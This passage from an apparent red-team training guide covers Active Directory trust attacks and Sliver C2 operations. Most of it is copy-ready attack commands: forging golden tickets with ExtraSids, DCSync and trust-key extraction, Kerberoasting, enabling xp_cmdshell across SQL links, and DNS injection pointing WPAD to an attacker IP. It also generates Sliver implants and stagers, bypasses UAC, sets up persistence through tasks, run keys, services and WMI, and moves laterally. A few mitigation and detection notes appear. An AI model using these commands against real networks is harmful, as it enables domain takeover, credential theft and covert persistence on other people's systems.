python3 dnstool.py -u 'child.corp.local\user' -p 'Password123' -a add -r '*.corp.local' -d attacker_ip dc01.corp.local

With a WPAD record pointing to an attacker-controlled server, browsers configured for WPAD proxy auto-discovery will send credentials through the attacker's proxy, enabling hash capture or relay.

11.3.5 ExtraSids Attack (Child to Parent)

The ExtraSids attack exploits the fact that within a forest, SID filtering is disabled by default on parent/child trusts. An attacker who compromises the krbtgt hash of a child domain can forge a Golden Ticket that includes the Enterprise Admins SID (or any other parent domain SID) in the ticket's ExtraSids field.

Golden Ticket with ExtraSids

The forged ticket is valid across the parent/child trust boundary because SID filtering is not applied. The Enterprise Admins SID (S-1-5-21-<root-domain>-519) in the ExtraSids field grants the ticket holder Enterprise Admin privileges in the parent domain.

Required information:

  • Child domain krbtgt NTLM hash
  • Child domain SID
  • Parent domain (root) SID
  • Enterprise Admins group RID (519)
From Windows (Mimikatz)
# Get child domain SID
Get-DomainSID

# Get parent domain SID
Get-DomainSID -Domain corp.local

# Forge Golden Ticket with ExtraSids
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:S-1-5-21-PARENT-SID-519 /ptt

# Verify access to parent DC
dir \\dc01.corp.local\C$
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\krbtgt
From Linux (ticketer.py)
# Forge inter-realm TGT with ExtraSids
impacket-ticketer -nthash KRBTGT_HASH -domain child.corp.local -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-PARENT-SID-519 Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
Remediation
  • SID filtering cannot be enabled on intra-forest trusts without breaking functionality
  • Focus on protecting the child domain's krbtgt account
  • Implement tiered administration: do not place forest-critical services in child domains
  • Monitor for TGTs with ExtraSids containing the Enterprise Admins SID (Event ID 4769 with SID field)
  • Use Microsoft's Protected Users group for privileged accounts

Methodology

  • From child domain, find vulnerable ADCS templates on parent CA: 
    certipy find -u user@child.corp.local -p 'Password123' -dc-ip 10.10.10.20 -vulnerable
  • Request a certificate impersonating a parent domain admin (ESC1): 
    certipy req -u user@child.corp.local -p 'Password123' -ca corp-ROOT-CA -target root-dc.corp.local -template VulnerableTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
  • Enumerate GPOs linked to AD Sites and check write permissions: 
    Get-DomainGPO -SearchBase "CN=Sites,CN=Configuration,DC=corp,DC=local"
Get-DomainGPO -Identity "{GPO-GUID}" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll" }
  • Read KDS root keys and compute gMSA passwords across the forest: 
    python3 GoldenGMSA.py -d corp.local -u user -p 'Password123' --kds-root-key-guid <GUID> --sid <gMSA-SID>
  • Inject DNS records in parent domain via dnstool (WPAD or wildcard): 
    python3 dnstool.py -u 'child.corp.local\user' -p 'Password123' -a add -r wpad.corp.local -d attacker_ip dc01.corp.local
  • Get child and parent domain SIDs for ExtraSids attack: 
    Get-DomainSID
Get-DomainSID -Domain corp.local
  • Forge Golden Ticket with ExtraSids (Windows): 
    mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:S-1-5-21-PARENT-SID-519 /ptt
dir \\dc01.corp.local\C$
  • Forge inter-realm TGT with ExtraSids (Linux): 
    impacket-ticketer -nthash KRBTGT_HASH -domain child.corp.local -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-PARENT-SID-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc01.corp.local

11.4 Cross-Forest Trust Attacks

If a two-way forest trust exists, a user in Forest A can request Kerberos service tickets for SPN-enabled accounts in Forest B. The returned tickets are encrypted with the target service account's password hash and can be cracked offline.

11.4.1 Cross-Forest Kerberoasting

If a two-way forest trust exists, a user in Forest A can request Kerberos service tickets for SPN-enabled accounts in Forest B. The returned tickets are encrypted with the target service account's password hash and can be cracked offline.

# Enumerate SPNs across forest trust
Get-DomainUser -SPN -Domain external.local -Server dc01.external.local

# Request service tickets for cross-forest SPNs
Rubeus.exe kerberoast /domain:external.local /dc:dc01.external.local /nowrap
# From Linux
impacket-GetUserSPNs -dc-ip 10.10.20.10 external.local/user:Password123 -target-domain external.local -request

11.4.2 Trust Account Attack

Each trust relationship has an associated trust account (a machine account object) in each domain. The trust account's password is shared between the two domains and used to create inter-realm TGTs. If an attacker can extract the trust account's password hash, they can forge inter-realm tickets.

# Dump the trust account hash using DCSync
mimikatz # lsadump::dcsync /domain:child.corp.local /user:corp$
# The trust account is named after the trusted domain with a trailing $

# Forge an inter-realm TGT
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /rc4:TRUST_HASH /service:krbtgt /target:corp.local /ptt
# Extract trust keys with secretsdump
impacket-secretsdump -just-dc-user 'corp$' child.corp.local/admin:Password123@child-dc.child.corp.local

11.4.3 Unconstrained Delegation Cross Forest

By default, TGT delegation across forest trusts is disabled. However, if the forest trust has the TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag set (or the TGTDelegation flag), unconstrained delegation servers in one forest can capture TGTs from users in the other forest.

# Check trust attributes for TGT delegation
Get-DomainTrust -Domain external.local | Select-Object TrustAttributes
# Look for: TREAT_AS_EXTERNAL, CROSS_ORGANIZATION, ENABLE_TGT_DELEGATION

# If TGT delegation is enabled, the attack is the same as intra-forest UD
# Compromise a UD server, coerce authentication from the foreign forest's DC, capture TGT

11.4.4 SID History Injection Attack (Cross-Forest)

SID History is designed for domain migrations: it preserves access when accounts move between domains. When a user authenticates, all SIDs in their SIDHistory attribute are added to the access token. If an attacker can modify the SIDHistory of an account, they can inject SIDs from a foreign domain to gain access to resources in that domain.

Across forest trusts, SID filtering is enabled by default, which strips SIDs from the foreign forest's domain SIDs in the ExtraSids field. However, SID filtering may have exceptions or may be entirely disabled.

# Check if SID filtering is enabled on the trust
netdom trust corp.local /domain:external.local /quarantine

# If SID filtering is disabled, inject SIDHistory
mimikatz # sid::add /sam:targetuser /new:S-1-5-21-FOREIGN-SID-512

11.4.5 SID Filter Bypass (CVE-2020-0665)

CVE-2020-0665 identified conditions under which SID filtering on forest trusts could be bypassed. The specific conditions:

  • The trust had been converted from an external (non-transitive) trust to a forest trust
  • The TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL flag was retained from the original external trust configuration
  • This flag caused SID filtering to apply "external trust" rules instead of "forest trust" rules, which were less restrictive

The less restrictive external trust SID filtering allows SIDs with an RID greater than 1000 to pass through. This means an attacker could inject SIDs for custom groups (RID > 1000) from the foreign forest into a forged ticket.

# Check for the TREAT_AS_EXTERNAL flag
Get-DomainTrust -Domain external.local | Select-Object TrustAttributes
# If TREAT_AS_EXTERNAL is present on a forest trust, it may be vulnerable
Remediation: Apply the February 2020 security update (KB4537820). After patching, forest trusts always apply forest-level SID filtering regardless of the TREAT_AS_EXTERNAL flag.

11.4.6 Abusing SQL Server Links (Cross-Forest)

SQL Server linked servers can create authenticated connections between SQL instances across forest boundaries. If a linked server uses a fixed SQL login or a domain service account with privileges in the foreign forest, an attacker can chain linked server queries to execute commands across the trust.

-- Enumerate linked servers
SELECT srvname, srvproduct, provider FROM master..sysservers;

-- Execute queries through linked servers
SELECT * FROM OPENQUERY([EXTERNAL-SQL], 'SELECT @@servername');

-- Chain through multiple linked servers
SELECT * FROM OPENQUERY([EXTERNAL-SQL], 'SELECT * FROM OPENQUERY([NEXT-SQL], ''SELECT @@servername'')');

-- Enable xp_cmdshell through linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [EXTERNAL-SQL];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [EXTERNAL-SQL];
EXEC ('xp_cmdshell ''whoami'';') AT [EXTERNAL-SQL];
# Enumerate links with mssqlclient
impacket-mssqlclient corp.local/user:Password123@sql01.corp.local
SQL> ENUM_LINKS
SQL> USE_LINK EXTERNAL-SQL
SQL> EXEC_CMD whoami

11.4.7 Abusing Foreign Security Principals and ACLs (Cross-Forest)

Foreign Security Principals (FSPs) represent principals from external trusted domains/forests. When a user from Forest B is added to a group in Forest A, an FSP object is created in Forest A's CN=ForeignSecurityPrincipals container.

# Enumerate FSPs
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" -Filter * -Properties *

# Find groups containing foreign members
Get-DomainForeignGroupMember

# Resolve FSP SIDs to names
$sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-FOREIGN-SID-1234")
$sid.Translate([System.Security.Principal.NTAccount]).Value

If an account from Forest B has been granted privileged access in Forest A (via group membership or direct ACL entries), compromising that account in Forest B provides a pivot into Forest A.

# BloodHound: find cross-forest FSP edges
MATCH (u:User)-[r]->(g:Group) WHERE u.domain ENDS WITH ".external.local" AND g.domain ENDS WITH ".corp.local" RETURN u.name, type(r), g.name

Methodology

  • Kerberoast across the forest trust to crack service account passwords: 
    impacket-GetUserSPNs -dc-ip 10.10.20.10 external.local/user:Password123 -target-domain external.local -request
  • Extract the trust account hash via DCSync: 
    impacket-secretsdump -just-dc-user 'corp$' child.corp.local/admin:Password123@child-dc.child.corp.local
  • Check trust attributes for TGT delegation flags: 
    Get-DomainTrust -Domain external.local | Select-Object TrustAttributes
  • Check SID filtering status and TREAT_AS_EXTERNAL flag on forest trust: 
    netdom trust corp.local /domain:external.local /quarantine
Get-DomainTrust -Domain external.local | Select-Object TrustAttributes
  • Enumerate and abuse SQL Server linked servers across the trust: 
    SELECT srvname, srvproduct, provider FROM master..sysservers;
SELECT * FROM OPENQUERY([EXTERNAL-SQL], 'SELECT @@servername');
EXEC ('xp_cmdshell ''whoami'';') AT [EXTERNAL-SQL];
  • Enumerate Foreign Security Principals and cross-forest group memberships: 
    Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" -Filter * -Properties *
Get-DomainForeignGroupMember
  • Use BloodHound to find cross-forest FSP edges: 
    MATCH (u:User)-[r]->(g:Group) WHERE u.domain ENDS WITH ".external.local" AND g.domain ENDS WITH ".corp.local" RETURN u.name, type(r), g.name

11.5 PAM Trusts and Mitigations

Privileged Access Management (PAM) trusts are a special forest trust type introduced in Windows Server 2016. A PAM trust allows a "bastion" forest to manage privileged access in a "production" forest using shadow principals and time-bound group membership.

11.5.1 Abusing PAM Trusts

Privileged Access Management (PAM) trusts are a special forest trust type introduced in Windows Server 2016. A PAM trust allows a "bastion" forest to manage privileged access in a "production" forest using shadow principals and time-bound group membership.

Key concepts:

  • Bastion forest: a hardened, isolated forest that manages privileged access
  • Shadow principals: objects in the bastion forest that map to groups in the production forest
  • Time-bound membership: principals added to shadow groups receive time-limited membership via TTL-based links

Attack vectors:

  • Compromising the bastion forest grants control over all shadow principals and their associated production forest privileges
  • If the PAM trust is misconfigured, standard users in the bastion forest may be able to add themselves to shadow principal groups
  • The bastion forest's AD objects and ACLs should be audited for over-permissive configurations
# Enumerate PAM trust
Get-ADTrust -Filter { ForestTransitive -eq $true } | Where-Object { $_.TrustType -eq "Forest" -and $_.SelectiveAuthentication -eq $true }

# List shadow principals
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Filter * -Properties *

11.5.2 Trust Attack Mitigations and Detections

Mitigation strategies:

  • SID filtering: ensure it is enabled on all inter-forest trusts; verify with netdom trust /quarantine
  • Selective authentication: restrict which principals from the trusted forest can authenticate; set the Allowed to Authenticate permission on target resources
  • TGT delegation: disable TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION on forest trusts unless explicitly required
  • Tiered administration: do not share administrative credentials across trust boundaries; isolate Tier 0 assets
  • Minimize cross-forest group membership: audit FSPs and remove unnecessary cross-forest access
  • Protect krbtgt accounts: rotate the krbtgt password in all domains regularly (every 180 days minimum)
  • Audit SQL Server links: remove or restrict cross-forest linked servers; avoid using high-privilege service accounts

Detection opportunities:

EventEvent IDWhat to Monitor
Kerberos TGT request4768TGTs with SIDs from foreign domains in the SIDHistory/ExtraSids field
Kerberos service ticket4769Cross-forest service ticket requests for sensitive SPNs
Trust modification4706, 4707, 4716Changes to trust direction, attributes, or SID filtering settings
Foreign group membership4728, 4732, 4756Principals from foreign domains added to local groups
ADCS enrollment4886, 4887Cross-domain certificate enrollment, especially with SANs for foreign principals
DNS record creation770-774New ADIDNS records (WPAD, wildcard) from foreign domain principals

12. C2 Operations with Sliver

Command and Control (C2) frameworks provide the infrastructure for managing implants on compromised hosts. This module covers Sliver, an open-source C2 framework developed by BishopFox, purpose-built for adversary simulation and red team operations.

12.1 Sliver Overview and Setup

A C2 framework coordinates post-exploitation activity across compromised hosts. It provides encrypted communications, task management, and operational tooling from a central server. Sliver is written in Go and generates cross-platform implants with support for multiple communication protocols.

12.1.1 Introduction to C2s and Sliver

A C2 framework coordinates post-exploitation activity across compromised hosts. It provides encrypted communications, task management, and operational tooling from a central server. Sliver is written in Go and generates cross-platform implants with support for multiple communication protocols.

Key features:

  • Cross-platform implants (Windows, Linux, macOS)
  • Dynamic code generation per implant (unique binaries)
  • Mutual TLS, WireGuard, HTTP(S), and DNS communication
  • In-memory .NET assembly execution
  • SOCKS5 proxying and port forwarding
  • BOF (Beacon Object File) support
  • Multiplayer mode for team operations
Installation
# Install Sliver server
curl https://sliver.sh/install | sudo bash

# Start the Sliver server
sliver-server

# Generate multiplayer config for team members
sliver-server operator --name operator1 --lhost 10.10.10.5 --save operator1.cfg
Architecture

Sliver uses a client-server architecture. The server manages listeners, implant generation, and task routing. Operators connect using gRPC with mutual TLS authentication. Each operator config contains certificates for secure access.

# Import operator config on client machine
sliver import operator1.cfg

# Connect to the team server
sliver

12.1.2 Implants, Beacons, and Listeners

Sliver supports two implant modes: sessions (persistent real-time connections) and beacons (asynchronous callback intervals). Sessions provide instant command execution but maintain a continuous connection. Beacons check in periodically, reducing network noise.

Listener Types
ProtocolTypeUse Case
mTLSEgressEncrypted peer-authenticated channel; best for internal networks
WireGuardEgressVPN-based transport; blends with WireGuard traffic
HTTPEgressBlends with web traffic; supports domain fronting
HTTPSEgressTLS-encrypted HTTP; most common for external operations
DNSEgressTunnels data via DNS queries; survives strict egress filtering
 
# Start an HTTPS listener
https --domain example.com --lport 443

# Start an mTLS listener
mtls --lhost 10.10.10.5 --lport 8888

# Start a DNS listener (requires authoritative NS record)
dns --domains c2.example.com --lport 53

# List active listeners (jobs)
jobs
Generating Implants
# Generate a session implant (real-time)
generate --mtls 10.10.10.5:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Generate a beacon implant (async)
generate beacon --http https://example.com --os windows --arch amd64 --seconds 30 --jitter 50 --save /tmp/beacon.exe

# Generate a shared library (DLL)
generate --mtls 10.10.10.5:8888 --os windows --format shared --save /tmp/implant.dll

# Generate shellcode
generate --mtls 10.10.10.5:8888 --os windows --format shellcode --save /tmp/implant.bin

# List generated implants
implants
Beacon Configuration

Beacon mode reduces detection risk by checking in at intervals rather than maintaining persistent connections. The --seconds flag sets the callback interval and --jitter adds randomness as a percentage of the interval.

# Beacon checking in every 60 seconds with 30% jitter
generate beacon --https https://c2.example.com --seconds 60 --jitter 30 --os windows --save /tmp/beacon.exe

# Interact with a beacon (commands queue until next check-in)
use [beacon-id]

# Force immediate check-in
interactive

12.1.3 Initial Access and Stagers

Stagers are small first-stage payloads that download and execute the full implant. This reduces the initial payload size and separates the delivery mechanism from the implant binary.

# Create a stager listener profile
profiles new beacon --mtls 10.10.10.5:8888 --os windows --arch amd64 --format shellcode --seconds 30 stager-profile

# Start a staging listener
stage-listener --url http://10.10.10.5:8080 --profile stager-profile

# Generate a stager (small payload that fetches the full implant)
generate stager --lhost 10.10.10.5 --lport 8080 --protocol http --save /tmp/stager.bin
MSF Integration: Sliver can serve as a stage for Metasploit stagers. Generate Sliver shellcode and serve it through a Metasploit handler, or use msf command within Sliver to spawn a Meterpreter session from an existing implant.

Methodology

  • Install and start the Sliver server: 
    curl https://sliver.sh/install | sudo bash
sliver-server
  • Generate operator configs for multiplayer and import on client: 
    sliver-server operator --name operator1 --lhost 10.10.10.5 --save operator1.cfg
sliver import operator1.cfg
  • Start listeners (HTTPS, mTLS, or DNS) for implant callbacks: 
    https --domain example.com --lport 443
mtls --lhost 10.10.10.5 --lport 8888
  • Generate a beacon implant with appropriate transport and callback interval: 
    generate beacon --http https://example.com --os windows --arch amd64 --seconds 30 --jitter 50 --save /tmp/beacon.exe
  • Generate shellcode or DLL format if a stager or sideload is needed: 
    generate --mtls 10.10.10.5:8888 --os windows --format shellcode --save /tmp/implant.bin
  • Set up a staging listener with a profile for small first-stage delivery: 
    profiles new beacon --mtls 10.10.10.5:8888 --os windows --arch amd64 --format shellcode --seconds 30 stager-profile
stage-listener --url http://10.10.10.5:8080 --profile stager-profile
generate stager --lhost 10.10.10.5 --lport 8080 --protocol http --save /tmp/stager.bin
  • Verify listener status and review generated implants: 
    jobs
implants

12.2 Commands and Post-Exploitation

Once an implant checks in, interact with it using the use command. Sliver provides built-in commands for file operations, process management, and execution.

12.2.1 Commands and Tools

Once an implant checks in, interact with it using the use command. Sliver provides built-in commands for file operations, process management, and execution.

CommandDescription
infoDisplay implant metadata (hostname, user, PID, OS)
psList running processes
lsList directory contents
cdChange working directory
pwdPrint working directory
catRead file contents
uploadUpload a file to the target
downloadDownload a file from the target
mkdirCreate a directory
rmRemove a file
shellSpawn an interactive system shell
executeExecute a program (non-interactive)
sideloadLoad and execute a shared library in memory
execute-assemblyExecute a .NET assembly in memory
 
# Interact with a session
use [session-id]

# Basic recon
info
whoami
ps
ls C:\\Users

# File operations
download C:\\Users\\admin\\Desktop\\secrets.txt /tmp/secrets.txt
upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe

# Execute a command
execute -o cmd.exe /c "ipconfig /all"

# Run a .NET assembly in memory
execute-assembly /opt/tools/Seatbelt.exe -- -group=all

# Sideload a DLL
sideload /tmp/payload.dll EntryPoint

12.2.2 Privilege Escalation

Privilege escalation from a standard user context to SYSTEM or Administrator enables access to protected resources and credentials stored on the host.

Checking Privileges
# Check current user and privileges
whoami
getuid
execute -o whoami /priv

# Look for exploitable services
execute-assembly /opt/tools/SharpUp.exe audit

# Check for unquoted service paths, writable service binaries, etc.
execute-assembly /opt/tools/Seatbelt.exe -- -group=system
Token Manipulation
# Elevate to SYSTEM via token impersonation
getsystem

# List available tokens
execute-assembly /opt/tools/SharpToken.exe list

# Impersonate a specific user token
impersonate DOMAIN\\admin

# Revert to original context
rev2self
UAC Bypass
# Check UAC settings
execute -o cmd.exe /c "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"

# UAC bypass via fodhelper
execute-assembly /opt/tools/SharpBypassUAC.exe fodhelper C:\\Windows\\Temp\\beacon.exe
Service Exploitation
# Find writable service binaries
execute-assembly /opt/tools/SharpUp.exe ModifiableServices

# Abuse a misconfigured service
execute -o sc.exe config VulnSvc binPath= "C:\\Windows\\Temp\\implant.exe"
execute -o sc.exe stop VulnSvc
execute -o sc.exe start VulnSvc

12.2.3 Persistence

Persistence mechanisms ensure continued access after reboots or session loss.

Scheduled Tasks
# Create a scheduled task for persistence
execute -o schtasks.exe /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\implant.exe" /sc onlogon /ru SYSTEM

# Verify the task
execute -o schtasks.exe /query /tn "WindowsUpdate" /fo list /v
Registry Run Keys
# User-level persistence (HKCU)
execute -o reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\user\AppData\Local\Temp\implant.exe" /f

# Machine-level persistence (requires admin)
execute -o reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\implant.exe" /f
Services
# Create a new service for persistence (requires admin)
execute -o sc.exe create PersistSvc binPath= "C:\\Windows\\Temp\\implant.exe" start= auto DisplayName= "Persistence Service"
execute -o sc.exe start PersistSvc
WMI Event Subscriptions
# WMI event subscription (via execute-assembly or PowerShell)
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "PersistFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistConsumer"
    CommandLineTemplate = "C:\Windows\Temp\implant.exe"
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

Methodology

  • Interact with a checked-in implant and gather host info: 
    use [session-id]
info
whoami
ps
  • Run initial privilege checks and enumeration assemblies: 
    execute -o whoami /priv
execute-assembly /opt/tools/SharpUp.exe audit
execute-assembly /opt/tools/Seatbelt.exe -- -group=system
  • Escalate to SYSTEM via token impersonation or service abuse: 
    getsystem
# Or exploit a misconfigured service
execute-assembly /opt/tools/SharpUp.exe ModifiableServices
execute -o sc.exe config VulnSvc binPath= "C:\\Windows\\Temp\\implant.exe"
execute -o sc.exe stop VulnSvc
execute -o sc.exe start VulnSvc
  • If UAC blocks elevation, bypass it: 
    execute -o cmd.exe /c "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
execute-assembly /opt/tools/SharpBypassUAC.exe fodhelper C:\\Windows\\Temp\\beacon.exe
  • Deploy persistence via scheduled task (SYSTEM context): 
    execute -o schtasks.exe /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\implant.exe" /sc onlogon /ru SYSTEM
execute -o schtasks.exe /query /tn "WindowsUpdate" /fo list /v
  • Deploy persistence via registry run key: 
    execute -o reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\user\AppData\Local\Temp\implant.exe" /f
  • Deploy persistence via a new auto-start service (requires admin): 
    execute -o sc.exe create PersistSvc binPath= "C:\\Windows\\Temp\\implant.exe" start= auto DisplayName= "Persistence Service"
execute -o sc.exe start PersistSvc

12.3 Domain Operations

Domain reconnaissance from a Sliver implant leverages BOFs (Beacon Object Files) and .NET assemblies loaded in memory to enumerate Active Directory without dropping tools to disk.

12.3.1 Domain Reconnaissance

Domain reconnaissance from a Sliver implant leverages BOFs (Beacon Object Files) and .NET assemblies loaded in memory to enumerate Active Directory without dropping tools to disk.

# Load and run BOFs for AD enumeration
# First, install the BOF extension pack
armory install all

# Enumerate domain users
sa-ldapquery -- "(objectClass=user)" cn,samaccountname,description

# Enumerate domain admins
sa-ldapquery -- "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" cn,samaccountname

# Run SharpHound for BloodHound collection
execute-assembly /opt/tools/SharpHound.exe -- -c All --outputdirectory C:\\Windows\\Temp
download C:\\Windows\\Temp\\*BloodHound*.zip /tmp/

# Enumerate SPNs for Kerberoasting candidates
execute-assembly /opt/tools/Rubeus.exe ; kerberoast /stats

# Run ADSearch for targeted queries
execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" --attributes cn,ms-MCS-AdmPwd

12.3.2 Pivoting

Pivoting routes traffic through a compromised host to reach isolated network segments.

SOCKS Proxy
# Start a SOCKS5 proxy through the implant
socks5 start

# The proxy binds on the Sliver server (default port 1081)
# Route tools through it
proxychains -q nmap -sT -Pn 172.16.1.0/24 -p 445,3389,5985

# Stop the proxy
socks5 stop
Port Forwarding
# Forward a local port to a remote host through the implant
portfwd add --bind 127.0.0.1:8445 --remote 172.16.1.10:445

# Access the forwarded port locally
smbclient -L //127.0.0.1 -p 8445 -U 'CORP\user%password'

# List active port forwards
portfwd

# Remove a port forward
portfwd rm --id 1
Pivot Listeners
# Start a TCP pivot listener on the compromised host
pivots tcp --bind 0.0.0.0:4444

# Generate an implant that connects through the pivot
generate --tcp-pivot 172.16.1.5:4444 --os windows --save /tmp/pivot-implant.exe

# The pivot implant routes through the first implant back to the C2 server
Chaining Implants

Multiple implants can be chained together to reach deeply segmented networks. The first implant acts as a relay, forwarding traffic from subsequent implants back to the C2 server. Use TCP pivot listeners on each hop.

12.3.3 Kerberos Exploitation

Kerberos attacks from Sliver leverage Rubeus loaded via execute-assembly and Impacket tools through SOCKS proxies.

# AS-REPRoasting
execute-assembly /opt/tools/Rubeus.exe ; asreproast /format:hashcat /outfile:C:\\Windows\\Temp\\asrep.txt

# Kerberoasting
execute-assembly /opt/tools/Rubeus.exe ; kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\kerb.txt

# Download hashes for offline cracking
download C:\\Windows\\Temp\\asrep.txt /tmp/
download C:\\Windows\\Temp\\kerb.txt /tmp/

# Request a TGT with known credentials
execute-assembly /opt/tools/Rubeus.exe ; asktgt /user:admin /password:P@ssw0rd /domain:corp.local /ptt

# Pass the Ticket
execute-assembly /opt/tools/Rubeus.exe ; ptt /ticket:[base64-ticket]

# Via SOCKS proxy with Impacket
proxychains -q impacket-GetUserSPNs corp.local/user:password -dc-ip 172.16.1.1 -request

12.3.4 Impersonation

Token impersonation allows executing commands in another user's security context without knowing their password.

# Create a token with known credentials
make-token -u admin -d CORP -p 'P@ssw0rd'

# Impersonate a logged-in user's token
impersonate CORP\\admin

# Verify the impersonated context
getuid
execute -o whoami

# Steal a token from a running process
steal-token [PID]

# Revert to original identity
rev2self

Methodology

  • Install BOF extensions and run AD enumeration queries: 
    armory install all
sa-ldapquery -- "(objectClass=user)" cn,samaccountname,description
sa-ldapquery -- "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" cn,samaccountname
  • Run SharpHound collection and download results: 
    execute-assembly /opt/tools/SharpHound.exe -- -c All --outputdirectory C:\\Windows\\Temp
download C:\\Windows\\Temp\\*BloodHound*.zip /tmp/
  • Start a SOCKS5 proxy or port forward for reaching isolated segments: 
    socks5 start
portfwd add --bind 127.0.0.1:8445 --remote 172.16.1.10:445
  • Set up TCP pivot listeners to chain implants into segmented networks: 
    pivots tcp --bind 0.0.0.0:4444
generate --tcp-pivot 172.16.1.5:4444 --os windows --save /tmp/pivot-implant.exe
  • Execute Kerberos attacks (AS-REPRoast, Kerberoast) and download hashes: 
    execute-assembly /opt/tools/Rubeus.exe ; asreproast /format:hashcat /outfile:C:\\Windows\\Temp\\asrep.txt
execute-assembly /opt/tools/Rubeus.exe ; kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\kerb.txt
download C:\\Windows\\Temp\\kerb.txt /tmp/
  • Request and inject Kerberos tickets for authenticated access: 
    execute-assembly /opt/tools/Rubeus.exe ; asktgt /user:admin /password:P@ssw0rd /domain:corp.local /ptt
execute-assembly /opt/tools/Rubeus.exe ; ptt /ticket:[base64-ticket]
  • Impersonate another user via token creation or theft: 
    make-token -u admin -d CORP -p 'P@ssw0rd'
impersonate CORP\\admin
getuid
rev2self

12.4 Lateral Movement and Escalation

Lateral movement spreads access to additional hosts within the network. Sliver provides built-in commands and supports external tooling via execute-assembly and SOCKS proxying.

12.4.1 Lateral Movement

Lateral movement spreads access to additional hosts within the network. Sliver provides built-in commands and supports external tooling via execute-assembly and SOCKS proxying.

# PsExec-style lateral movement
psexec -t 172.16.1.10 -u CORP\\admin -p 'P@ssw0rd' -s /tmp/implant.exe

# WMI lateral movement via Impacket through SOCKS
proxychains -q impacket-wmiexec CORP/admin:'P@ssw0rd'@172.16.1.10

# WinRM lateral movement via Impacket through SOCKS
proxychains -q evil-winrm -i 172.16.1.10 -u admin -p 'P@ssw0rd'

# Upload and execute on remote host via SMB
upload /tmp/implant.exe \\\\172.16.1.10\\C$\\Windows\\Temp\\implant.exe
execute-assembly /opt/tools/SharpWMI.exe ; action=exec computername=SRV01 command="C:\\Windows\\Temp\\implant.exe"

12.4.2 Kerberos Delegation

Delegation attacks allow escalating privileges by abusing how Kerberos forwards authentication to backend services.

Unconstrained Delegation
# Find unconstrained delegation computers
execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes cn,dnshostname

# Monitor for incoming TGTs (requires SYSTEM on the delegation host)
execute-assembly /opt/tools/Rubeus.exe ; monitor /interval:5 /nowrap

# Coerce authentication from a DC using SpoolSample
execute-assembly /opt/tools/SpoolSample.exe DC01.corp.local DVHOST01.corp.local

# Use the captured TGT
execute-assembly /opt/tools/Rubeus.exe ; ptt /ticket:[base64-ticket]
Constrained Delegation
# Find constrained delegation accounts
execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))" --attributes cn,msDS-AllowedToDelegateTo

# Perform S4U attack to obtain a service ticket as any user
execute-assembly /opt/tools/Rubeus.exe ; s4u /user:sqlsvc /rc4:[hash] /impersonateuser:administrator /msdsspn:cifs/DC01.corp.local /ptt
Resource-Based Constrained Delegation
# Check if you can write msDS-AllowedToActOnBehalfOfOtherIdentity
execute-assembly /opt/tools/StandIn.exe -- --computer SRV01 --object

# Configure RBCD (requires write access to the target computer object)
execute-assembly /opt/tools/StandIn.exe -- --computer SRV01 --grant YOURCOMPUTER$ --write

# Alternatively via PowerView through execute-assembly
execute-assembly /opt/tools/Rubeus.exe ; hash /password:Password123 /user:YOURCOMPUTER$ /domain:corp.local
